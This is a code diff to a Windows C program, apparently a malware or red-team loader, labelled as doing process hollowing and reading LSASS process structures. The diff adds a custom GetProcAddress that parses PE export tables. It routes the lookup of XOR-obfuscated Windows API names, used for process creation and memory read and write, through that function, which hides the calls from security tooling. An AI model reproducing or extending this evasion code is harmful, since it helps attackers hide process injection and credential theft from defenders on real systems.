@@ -10,13 +10,7 @@
 
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
-#include <psapi.h>
 #include <stdio.h>
-#include <stdlib.h>
-#include <stdarg.h>
-#include <string.h>
-#include <tlhelp32.h>
-
 
 // =====================================================
 // API Deobfuscation Functions (XOR)
@@ -132,6 +126,67 @@ HMODULE LoadCleanDLL(char* dllPath) {
 }
 
 // =====================================================
+// get_proc_address reimplementation
+// =====================================================
+
+FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
+    if (hModule == NULL || lpProcName == NULL) {
+        printf("Invalid module handle or function name.\n");
+        return NULL;
+    }
+
+    // Get the base address of the module
+    BYTE* baseAddr = (BYTE*)hModule;
+
+    // Validate the DOS header
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddr;
+    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        printf("[!] Invalid DOS signature.\n");
+        return NULL;
+    }
+
+    // Retrieve the NT headers using the DOS header's e_lfanew field
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddr + dosHeader->e_lfanew);
+    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
+        printf("[!] Invalid NT signature.\n");
+        return NULL;
+    }
+
+    // Get the Export Directory from the Data Directory
+    IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (exportDataDir.VirtualAddress == 0) {
+        printf("[!] No export directory found.\n");
+        return NULL;
+    }
+
+    // Get a pointer to the Export Directory
+    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(baseAddr + exportDataDir.VirtualAddress);
+
+    // Get pointers to the arrays of function addresses, names and name ordinals
+    DWORD* addressOfFunctions = (DWORD*)(baseAddr + exportDir->AddressOfFunctions);
+    DWORD* addressOfNames = (DWORD*)(baseAddr + exportDir->AddressOfNames);
+    WORD* addressOfNameOrdinals = (WORD*)(baseAddr + exportDir->AddressOfNameOrdinals);
+
+    // Iterate through the exported names to find the desired function
+    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+        char* functionName = (char*)(baseAddr + addressOfNames[i]);
+        if (_stricmp(functionName, lpProcName) == 0) {
+            // Retrieve the ordinal for the found function
+            WORD ordinal = addressOfNameOrdinals[i];
+            // Get the RVA of the function
+            DWORD functionRVA = addressOfFunctions[ordinal];
+            printf("[+] Found %s at ordinal %hu, RVA: 0x%08X\n", lpProcName, ordinal, functionRVA);
+            // Return the absolute address of the function
+            return (FARPROC)(baseAddr + functionRVA);
+        }
+    }
+
+    printf("[!] Function %s not found.\n", lpProcName);
+    return NULL;
+}
+
+
+// =====================================================
 // Main – Process Hollowing + LSASS EPROCESS Reading
 // =====================================================
 int main(int argc, char* argv[]) {
@@ -198,11 +253,11 @@ int main(int argc, char* argv[]) {
     strRT = xor_decrypt_string((unsigned char*)strRT, sizeof(RT_ENC), XOR_KEY, key_len);
     strZQIP = xor_decrypt_string((unsigned char*)strZQIP, sizeof(ZQIP_ENC), XOR_KEY, key_len);
 
-    PFN_CPW pCPW = (PFN_CPW)GetProcAddress(hKernel32, strCPW);
-    PFN_RPM pRPM = (PFN_RPM)GetProcAddress(hKernel32, strRPM);
-    PFN_WPM pWPM = (PFN_WPM)GetProcAddress(hKernel32, strWPM);
-    PFN_RT  pRT = (PFN_RT)GetProcAddress(hKernel32, strRT);
-    PFN_ZQIP pZQIP = (PFN_ZQIP)GetProcAddress(hNtdll, strZQIP);
+    PFN_CPW pCPW = (PFN_CPW)CustomGetProcAddress(hKernel32, strCPW);
+    PFN_RPM pRPM = (PFN_RPM)CustomGetProcAddress(hKernel32, strRPM);
+    PFN_WPM pWPM = (PFN_WPM)CustomGetProcAddress(hKernel32, strWPM);
+    PFN_RT  pRT = (PFN_RT)CustomGetProcAddress(hKernel32, strRT);
+    PFN_ZQIP pZQIP = (PFN_ZQIP)CustomGetProcAddress(hNtdll, strZQIP);
     if (!pCPW || !pRPM || !pWPM || !pRT || !pZQIP) {
         printf("[ERROR] Error retrieving API addresses.\n");
         return 1;
